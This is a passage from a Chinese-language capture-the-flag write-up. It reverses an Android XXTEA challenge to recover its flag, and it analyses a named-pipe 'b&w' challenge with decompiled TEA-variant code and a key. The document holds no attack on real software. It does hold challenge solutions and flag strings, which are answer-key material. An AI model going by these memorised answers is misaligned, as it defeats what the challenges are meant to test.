class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n+<span class="number">1</span>):</span><br><span class="line">            after = m[(i + <span class="number">1</span>) % <span class="built_in">len</span>(m)]</span><br><span class="line">            before = m[(i - <span class="number">1</span>) % <span class="built_in">len</span>(m)]</span><br><span class="line">            m[i] = (m[i] + ((((before &gt;&gt; <span class="number">5</span>) ^ (after &lt;&lt; <span class="number">2</span>)) + ((after &gt;&gt; <span class="number">3</span>) ^ (before &lt;&lt; <span class="number">4</span>))) ^ ((ttl ^ after) + (k[(i &amp; <span class="number">3</span>) ^ ((ttl &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>)] ^ before)))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de_XXTEA</span>(<span class="params">m, leng, k</span>):</span><br><span class="line">    n = leng - <span class="number">1</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // (n + <span class="number">1</span>)</span><br><span class="line">    ttl = ((rounds + <span class="number">1</span>) * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        ttl = (ttl - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            after = m[(i + <span class="number">1</span>) % <span class="built_in">len</span>(m)]</span><br><span class="line">            before = m[(i - <span class="number">1</span>) % <span class="built_in">len</span>(m)]</span><br><span class="line">            m[i] = (m[i] - ((((before &gt;&gt; <span class="number">5</span>) ^ (after &lt;&lt; <span class="number">2</span>)) + ((after &gt;&gt; <span class="number">3</span>) ^ (before &lt;&lt; <span class="number">4</span>))) ^ ((ttl ^ after) + (k[(i &amp; <span class="number">3</span>) ^ ((ttl &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>)] ^ before)))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0x61</span>, <span class="number">0x80</span>, <span class="number">0x8a</span>, <span class="number">0x2d</span>, <span class="number">0x69</span>, <span class="number">0x52</span>, <span class="number">0x27</span>, <span class="number">0xdc</span>, <span class="number">0x78</span>, <span class="number">0x95</span>, <span class="number">0x85</span>,</span><br><span class="line">       <span class="number">0x66</span>, <span class="number">0xee</span>, <span class="number">0x2a</span>, <span class="number">0xa5</span>, <span class="number">0x1e</span>, <span class="number">0xdf</span>, <span class="number">0xc4</span>, <span class="number">0x5e</span>, <span class="number">0xf8</span>, <span class="number">0x1a</span>, <span class="number">0x84</span>,</span><br><span class="line">       <span class="number">0x4a</span>, <span class="number">0x0a</span>, <span class="number">0x11</span>, <span class="number">0xed</span>, <span class="number">0x9d</span>, <span class="number">0x97</span>, <span class="number">0x40</span>, <span class="number">0x67</span>, <span class="number">0x46</span>, <span class="number">0x61</span>, <span class="number">0xa1</span>,</span><br><span class="line">       <span class="number">0x35</span>, <span class="number">0x0f</span>, <span class="number">0x4a</span>, <span class="number">0x84</span>, <span class="number">0xf5</span>, <span class="number">0xd8</span>, <span class="number">0x79</span>, <span class="number">0xfd</span>, <span class="number">0xc4</span>, <span class="number">0xa9</span>, <span class="number">0xb8</span>]</span><br><span class="line">key = [<span class="number">0x38</span>, <span class="number">0x38</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x35</span>, <span class="number">0x39</span>, <span class="number">0x65</span>, <span class="number">0x32</span>,</span><br><span class="line">       <span class="number">0x30</span>, <span class="number">0x34</span>, <span class="number">0x61</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x63</span>, <span class="number">0x35</span>]</span><br><span class="line">test = [<span class="number">0x38</span>, <span class="number">0x38</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x35</span>, <span class="number">0x39</span>, <span class="number">0x65</span>, <span class="number">0x32</span>,</span><br><span class="line">        <span class="number">0x30</span>, <span class="number">0x34</span>, <span class="number">0x61</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x63</span>, <span class="number">0x35</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">dwordenc = bytes_to_dwords_little_endian(enc)</span><br><span class="line">dwordkey = bytes_to_dwords_little_endian(key)</span><br><span class="line">dwordtest = bytes_to_dwords_little_endian(test)</span><br><span class="line"><span class="comment"># 加解密测试</span></span><br><span class="line"><span class="comment"># dwordresult = XXTEA(dwordtest, len(dwordtest), dwordkey)</span></span><br><span class="line"><span class="comment"># result = dwords_to_bytes_little_endian(dwordresult)</span></span><br><span class="line"><span class="comment"># for i in range(len(result)):</span></span><br><span class="line"><span class="comment">#     print(hex(result[i]),end=&quot;, &quot;)</span></span><br><span class="line"><span class="comment"># print()</span></span><br><span class="line"><span class="comment"># dwordresult2 = de_XXTEA(dwordresult, len(dwordresult), dwordkey)</span></span><br><span class="line"><span class="comment"># result2 = dwords_to_bytes_little_endian(dwordresult2)</span></span><br><span class="line"><span class="comment"># for i in range(len(result2)):</span></span><br><span class="line"><span class="comment">#     print(hex(result2[i]), end=&quot;, &quot;)</span></span><br><span class="line"><span class="comment"># 解密flag</span></span><br><span class="line">dwordflag = de_XXTEA(dwordenc, <span class="built_in">len</span>(dwordenc), dwordkey)</span><br><span class="line">flag = dwords_to_bytes_little_endian(dwordflag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(flag[i]), end=<span class="string">&quot;, &quot;</span>)</span><br></pre></td></tr></table></figure>
<p>运行脚本得到flag：<font color=deepskyblue><strong>flag{AnDr01d_r3v3rs3_jUcYuWzBSSOwKxbMD}</strong></font>.</p>
<h2 id="b-w："><a href="#b-w：" class="headerlink" title="b&amp;w："></a>b&amp;w：</h2><p>发现是双子程序进程间通信，搜索“waiting for”之后找到两个程序的主函数：</p>
<p>black：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_7FF6F4B05EC0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  v55 = <span class="number">-2</span>i64;</span><br><span class="line">  v53 = <span class="number">0</span>;</span><br><span class="line">  v52 = <span class="number">0</span>;</span><br><span class="line">  v51 = <span class="number">0</span>;</span><br><span class="line">  sub_7FF6F4B051C0(v15, &amp;off_7FF6F4B57568, <span class="number">1</span>i64);					<span class="comment">//waiting for white</span></span><br><span class="line">  sub_7FF6F4B3ED50(v15);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF6F4B01DB0(v19);</span><br><span class="line">    LOBYTE(v0) = <span class="number">1</span>;</span><br><span class="line">    v14 = sub_7FF6F4B01E40(v19, v0);</span><br><span class="line">    v17 = sub_7FF6F4B042C0(</span><br><span class="line">            v14,</span><br><span class="line">            (__int64)<span class="string">&quot;\\\\.\\pipe\\white_to_black\\\\.\\pipe\\black_to_whiteConnected to white.\n&quot;</span>,</span><br><span class="line">            <span class="number">23</span>i64);</span><br><span class="line">    v18 = v1;</span><br><span class="line">    <span class="keyword">if</span> ( !v17 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_7FF6F4B01350(&amp;v17);</span><br><span class="line">    v9 = sub_7FF6F4B023C0(<span class="number">1</span>i64);</span><br><span class="line">    sub_7FF6F4B3D470(v9, v10);</span><br><span class="line">  &#125;</span><br><span class="line">  v53 = <span class="number">1</span>;</span><br><span class="line">  v16 = v18;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF6F4B01DB0(v23);</span><br><span class="line">    LOBYTE(v2) = <span class="number">1</span>;</span><br><span class="line">    v13 = sub_7FF6F4B01E50(v23, v2);</span><br><span class="line">    v21 = sub_7FF6F4B042C0(v13, (__int64)<span class="string">&quot;\\\\.\\pipe\\black_to_whiteConnected to white.\n&quot;</span>, <span class="number">23</span>i64);</span><br><span class="line">    v22 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( !v21 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_7FF6F4B01350(&amp;v21);</span><br><span class="line">    v7 = sub_7FF6F4B023C0(<span class="number">1</span>i64);</span><br><span class="line">    sub_7FF6F4B3D470(v7, v8);</span><br><span class="line">  &#125;</span><br><span class="line">  v52 = <span class="number">1</span>;</span><br><span class="line">  v20 = v22;</span><br><span class="line">  v53 = <span class="number">0</span>;</span><br><span class="line">  sub_7FF6F4B055D0(v24, v16);</span><br><span class="line">  v51 = <span class="number">1</span>;</span><br><span class="line">  v52 = <span class="number">0</span>;</span><br><span class="line">  v25 = v20;</span><br><span class="line">  sub_7FF6F4B051C0(v26, &amp;off_7FF6F4B575C0, <span class="number">1</span>i64);</span><br><span class="line">  sub_7FF6F4B3ED50(v26);</span><br><span class="line">  v28[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">//16字节密钥，也按dword代入(从上到下分别为0x00114514, 0x19198100, 0xDEADBEEF, 0x00070201)</span></span><br><span class="line">  v28[<span class="number">1</span>] = <span class="number">0x11</span>;</span><br><span class="line">  v28[<span class="number">2</span>] = <span class="number">0x45</span>;</span><br><span class="line">  v28[<span class="number">3</span>] = <span class="number">0x14</span>;</span><br><span class="line">  v28[<span class="number">4</span>] = <span class="number">0x19</span>;</span><br><span class="line">  v28[<span class="number">5</span>] = <span class="number">0x19</span>;</span><br><span class="line">  v28[<span class="number">6</span>] = <span class="number">0x81</span>;</span><br><span class="line">  v28[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">  v28[<span class="number">8</span>] = <span class="number">0xDE</span>;</span><br><span class="line">  v28[<span class="number">9</span>] = <span class="number">0xAD</span>;</span><br><span class="line">  v28[<span class="number">10</span>] = <span class="number">0xBE</span>;</span><br><span class="line">  v28[<span class="number">11</span>] = <span class="number">0xEF</span>;</span><br><span class="line">  v28[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">  v28[<span class="number">13</span>] = <span class="number">7</span>;</span><br><span class="line">  v28[<span class="number">14</span>] = <span class="number">2</span>;</span><br><span class="line">  v28[<span class="number">15</span>] = <span class="number">1</span>;</span><br><span class="line">  sub_7FF7FD5A3C30(v27, v28);</span><br><span class="line">  sub_7FF7FD5A2B70(v29, v27);</span><br><span class="line">  v43 = <span class="number">0</span>;</span><br><span class="line">  v32[<span class="number">2</span>] = v24[<span class="number">2</span>];</span><br><span class="line">  v32[<span class="number">1</span>] = v24[<span class="number">1</span>];</span><br><span class="line">  v32[<span class="number">0</span>] = v24[<span class="number">0</span>];</span><br><span class="line">  sub_7FF7FD5A54A0(v31, v32);</span><br><span class="line">  sub_7FF7FD5A69A0(Src, v31);</span><br><span class="line">  memcpy_0(v33, Src, <span class="keyword">sizeof</span>(v33));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> ) <span class="comment">//主逻辑无限循环</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF6F4B06B00(&amp;v34, (__int64)v33); <span class="comment">//读取white的管道传来的文本，v33指向传入的文本地址，v34为输入字符串的长度+2</span></span><br><span class="line">    <span class="keyword">if</span> ( (_QWORD)v34 == <span class="number">0x8000000000000001u</span>i64 ) <span class="comment">//读取错误则退出循环</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v37 = v35; <span class="comment">//真实长度</span></span><br><span class="line">    v36 = v34; <span class="comment">//长度+2</span></span><br><span class="line">    sub_7FF6F4B05710(v38, &amp;v36, (<span class="type">int</span>)<span class="string">&quot;Failed to read line&quot;</span>, <span class="number">19</span>, (__int64)&amp;off_7FF6F4B575E8); <span class="comment">//读取失败</span></span><br><span class="line">    v5 = sub_7FF6F4B046E0(v38); <span class="comment">//v5是传入的文本（先前已经经过一次变换），v38是长度+2</span></span><br><span class="line">    sub_7FF7FD5A5C00(v39, v29, v5, v6); <span class="comment">//四个参数分别为返回结果地址、密钥、明文和明文的真实长度</span></span><br><span class="line">    sub_7FF6F4B01830(v48, &amp;unk_7FF6F4B57600, v47);</span><br><span class="line">    *(_QWORD *)&amp;v54 = v48;</span><br><span class="line">    *((_QWORD *)&amp;v54 + <span class="number">1</span>) = sub_7FF6F4B04880;</span><br><span class="line">    v50[<span class="number">1</span>] = v54;</span><br><span class="line">    v50[<span class="number">0</span>] = v54;</span><br><span class="line">    sub_7FF6F4B050D0((<span class="type">unsigned</span> <span class="type">int</span>)v49, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_7FF6F4B57748, <span class="number">2</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v50, <span class="number">1</span>i64);</span><br><span class="line">    v12 = sub_7FF6F4B04470(&amp;v25, v49); <span class="comment">//此时white已经接收到加密内容并输出加密结果</span></span><br><span class="line">    sub_7FF6F4B058D0(v12, <span class="string">&quot;Failed to write to pipe&quot;</span>, <span class="number">23</span>i64, &amp;off_7FF6F4B57780);</span><br><span class="line">    v11 = sub_7FF6F4B01E60(&amp;v25);</span><br><span class="line">    sub_7FF6F4B058D0(v11, <span class="string">&quot;Failed to flush pipe&quot;</span>, <span class="number">20</span>i64, &amp;off_7FF6F4B577B0);</span><br><span class="line">    sub_7FF6F4B01170(v48);</span><br><span class="line">    sub_7FF6F4B01170(v46);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_7FF6F4B010F0(v41);</span><br><span class="line">  result = sub_7FF6F4B01150(&amp;v25);</span><br><span class="line">  v51 = <span class="number">0</span>;</span><br><span class="line">  v52 = <span class="number">0</span>;</span><br><span class="line">  v53 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现输入的文本到v5这里已经经过了一层简单的变换，具体变换方式为：</p>
<p>abcdefghijklmnopqrstuvwxyz（不论大小写）→mlkjihgfedcbazyxwvutsrqpon（反向rot13），1234567890→3210987654（其他特殊符号不变），之后带入black中进行加密，运行程序测试发现每次加密结果不一样，研究密文结构，举其中一例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1111111111111111：18 08 87 21 c6 fd 11 1b 18 08 87 21 c6 fd 11 1b 12 22 8d 1b 8b 72 fd 21</span><br><span class="line">1111111111111112：18 08 87 21 c6 fd 11 1b 6c 2d 80 d7 a3 3c e5 af 12 22 8d 1b 8b 72 fd 21</span><br><span class="line">2111111111111111：d3 c1 38 cd aa 28 62 c9 18 08 87 21 c6 fd 11 1b 12 22 8d 1b 8b 72 fd 21</span><br><span class="line">无输入：12 22 8d 1b 8b 72 fd 21</span><br></pre></td></tr></table></figure>
<p>发现明文应该是按两个dword组成一个块带入加密的（8字节），并且在最后还会输出额外的8字节，猜测这是一个用于额外随机加密的密钥，整理上述发现：</p>
<p>①	明文会先在某处（可能是white）进行按字符的重映射，映射效果类似反向的ROT加密<br><br>②	变换过的明文按两个dword一组带入进行了某种加密（猜测是TEA类），密钥为16字节：00 11 45 14 19 19 81 00 DE AD BE EF 00 07 02 01<br><br>③	明文还会和某两个随机dword进行某种加密，这两个dword会和密文一起输出<br></p>
<p>观察flag密文：<font color=lime><strong>X2+L9DsxzsH2Y3a9xa6W8Ku81qkJp6&#x2F;FPspYWrXXxYmNpbnIJBEI5g&#x3D;&#x3D;</strong></font>对应40字节：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5f 6f 8b f4 3b 31 ce c1 f6 63 76 bd c5 ae 96 f0 ab bc d6 a9 09 a7 af c5 3e ca 58 5a b5 d7 c5 89 8d a5 b9 c8 24 11 08 e6</span><br></pre></td></tr></table></figure>
<p>则对应的flag应为32字节，最后8字节是当时随机生成的密钥，观察上文提到的black程序中的加密函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall <span class="title function_">sub_7FF6F4B05C00</span><span class="params">(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  v26 = <span class="number">-2</span>i64;</span><br><span class="line">  sub_7FF6F4B05B20(v17, a3, a4); <span class="comment">//将明文复制到v17的缓冲区</span></span><br><span class="line">  sub_7FF6F4B03930(v18);</span><br><span class="line">  v4 = sub_7FF6F4B039D0(v17);</span><br><span class="line">  core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::chunks::hec8614e01ec4a057( (<span class="type">unsigned</span> <span class="type">int</span>)v20,v4,v5,<span class="number">8</span>, (__int64)&amp;off_7FF6F4B57520);</span><br><span class="line">  sub_7FF6F4B052F0(v19, v20); <span class="comment">//将明文按8字节分割成一块</span></span><br><span class="line">  v21[<span class="number">0</span>] = v19[<span class="number">0</span>];</span><br><span class="line">  v21[<span class="number">1</span>] = v19[<span class="number">1</span>];</span><br><span class="line">  v21[<span class="number">2</span>] = v19[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> ) <span class="comment">//按块进行加密</span></span><br><span class="line">  &#123;</span><br><span class="line">    v22 = sub_7FF6F4B05310(v21); <span class="comment">//获取块</span></span><br><span class="line">    v23 = v6;</span><br><span class="line">    <span class="keyword">if</span> ( !v22 ) <span class="comment">//没有可用块则结束</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v12 = v22; <span class="comment">//指针</span></span><br><span class="line">    v13 = v23;</span><br><span class="line">    v24[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">    v24[<span class="number">2</span>] = <span class="number">0</span>i64;</span><br><span class="line">    v24[<span class="number">5</span>] = <span class="number">0</span>i64;</span><br><span class="line">    v24[<span class="number">4</span>] = <span class="number">0</span>i64;</span><br><span class="line">    v24[<span class="number">7</span>] = <span class="number">0</span>i64;</span><br><span class="line">    v25 = sub_7FF6F4B03BB0(<span class="number">0</span>i64);</span><br><span class="line">    v24[<span class="number">6</span>] = v25;</span><br><span class="line">    v24[<span class="number">3</span>] = v25;</span><br><span class="line">    v24[<span class="number">0</span>] = v25; <span class="comment">//这里v24被初始化为全0</span></span><br><span class="line">    v8 = sub_7FF6F4B019D0((__int64)v24, <span class="number">8</span>i64); <span class="comment">//检验v24</span></span><br><span class="line">    sub_7FF6F4B34EB0(v8, v9, v12, v13, (__int64)&amp;off_7FF6F4B57538); <span class="comment">//搬运数据，v12为文本的地址，第五个参数指向src/main.rs</span></span><br><span class="line">    sub_7FF6F4B028B0(a2, (__int64)v24); <span class="comment">//密钥加密函数，a2为密钥，v24为8字节的明文块</span></span><br><span class="line">    v10 = sub_7FF6F4B34F40(v24, <span class="number">8</span>i64);</span><br><span class="line">    sub_7FF6F4B376D0(v18, v10, v11);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v18[<span class="number">0</span>];</span><br><span class="line">  a1[<span class="number">1</span>] = v18[<span class="number">1</span>];</span><br><span class="line">  a1[<span class="number">2</span>] = v18[<span class="number">2</span>];</span><br><span class="line">  sub_7FF6F4B01180((__int64)v17);</span><br><span class="line">  <span class="keyword">return</span> a1; <span class="comment">//返回结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看加密函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF7FD5A28B0</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  v21 = sub_7FF7FD5D4F40(a2, <span class="number">8</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">4</span> )</span><br><span class="line">    sub_7FF7FD5F5330(<span class="number">4</span>i64, v2, &amp;off_7FF7FD5F69E0);</span><br><span class="line">  sub_7FF7FD5A1930(<span class="number">0</span>i64, <span class="number">4</span>i64, v2);</span><br><span class="line">  v17 = _$LT$byteorder..BigEndian$u20$as$u20$byteorder..ByteOrder$GT$::read_u32::h17cc09fd16e4f66e(v21, <span class="number">4</span>i64); <span class="comment">//前4字节大端序</span></span><br><span class="line">  v18 = sub_7FF7FD5D4F40(a2, <span class="number">8</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">8</span> )</span><br><span class="line">sub_7FF7FD5F5330(<span class="number">8</span>i64, v3, &amp;off_7FF7FD5F69E0);</span><br><span class="line">  sub_7FF7FD5A1930(<span class="number">4</span>i64, <span class="number">8</span>i64, v3);</span><br><span class="line">  v4 = _$LT$byteorder..BigEndian$u20$as$u20$byteorder..ByteOrder$GT$::read_u32::h17cc09fd16e4f66e(v18 + <span class="number">4</span>, <span class="number">4</span>i64); <span class="comment">//后4字节大端序</span></span><br><span class="line">  v15 = sub_7FF7FD5A40A0(a1, v17, v4); <span class="comment">//加密函数</span></span><br><span class="line">  v16 = v5;</span><br><span class="line">  v6 = sub_7FF7FD5A19D0(a2, <span class="number">8</span>i64);</span><br><span class="line">  v8 = sub_7FF7FD5D44B0(<span class="number">0</span>, <span class="number">4</span>, v6, v7, (__int64)&amp;off_7FF7FD5F69E0);</span><br><span class="line">  _$LT$byteorder..BigEndian$u20$as$u20$byteorder..ByteOrder$GT$::write_u32::h31d90aa70fb2cefc(v8, v9, v15);</span><br><span class="line">  v10 = sub_7FF7FD5A19D0(a2, <span class="number">8</span>i64);</span><br><span class="line">  v12 = sub_7FF7FD5D44B0(<span class="number">4</span>, <span class="number">8</span>, v10, v11, (__int64)&amp;off_7FF7FD5F69E0);</span><br><span class="line">  <span class="keyword">return</span> _$LT$byteorder..BigEndian$u20$as$u20$byteorder..ByteOrder$GT$::write_u32::h31d90aa70fb2cefc(v12, v13, v16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看详细加密：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF7FD5A40A0</span><span class="params">(<span class="type">int</span> *a1, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v13 = *a1; <span class="comment">//密钥的4个dword</span></span><br><span class="line">  v14 = a1[<span class="number">1</span>];</span><br><span class="line">  v15 = a1[<span class="number">2</span>];</span><br><span class="line">  v16 = a1[<span class="number">3</span>];</span><br><span class="line">  v20[<span class="number">0</span>] = sub_7FF7FD5A2190(<span class="number">0</span>i64, <span class="number">64</span>i64); <span class="comment">//初始化为0和0x40</span></span><br><span class="line">  v20[<span class="number">1</span>] = v3;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = sub_7FF7FD5A2180(v20); <span class="comment">//1，同时将v20改为1</span></span><br><span class="line">    v22 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( !v21 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v17 += a1[<span class="number">4</span>]; <span class="comment">//sum += delta</span></span><br><span class="line">    v6 = shl(a3, <span class="number">4</span>); <span class="comment">//v1 &lt;&lt; 4</span></span><br><span class="line">    v10 = rev_xor((<span class="type">unsigned</span> <span class="type">int</span>)(v13 + v6), (<span class="type">unsigned</span> <span class="type">int</span>)(v17 + a3)); <span class="comment">//(v1 + sum) ^ ((v1 &lt;&lt; 4) + k0)</span></span><br><span class="line">v7 = shr(a3, <span class="number">5</span>); <span class="comment">//v1 &gt;&gt; 5</span></span><br><span class="line">a2 += rev_xor(v10, (<span class="type">unsigned</span> <span class="type">int</span>)(v14 + v7)); <span class="comment">//((v1 &gt;&gt; 5) + k1) ^ ((v1 + sum) ^ ((v1 &lt;&lt; 4) + k0))</span></span><br><span class="line">    v8 = shl(a2, <span class="number">4</span>);</span><br><span class="line">    v11 = rev_xor((<span class="type">unsigned</span> <span class="type">int</span>)(v15 + v8), (<span class="type">unsigned</span> <span class="type">int</span>)(v17 + a2));</span><br><span class="line">    v9 = shr(a2, <span class="number">5</span>);</span><br><span class="line">a3 += rev_xor(v11, (<span class="type">unsigned</span> <span class="type">int</span>)(v16 + v9));  </span><br><span class="line">&#125;</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一看就是TEA加密，只不过delta是个随机值，并且轮数为64轮，编写同构脚本进行模拟，发现密文尾部多出来的8字节并不是delta，而是由2个全0明文加密生成的密文，经过多次尝试发现当字节个数不够8的倍数时会自动补全到8的倍数，用\x00填充，而如果本身就是8的倍数，则会在末尾额外添加8个\x00字节，但是不确定flag的长度是不是8的倍数，所以直接编写脚本爆破delta：</p>
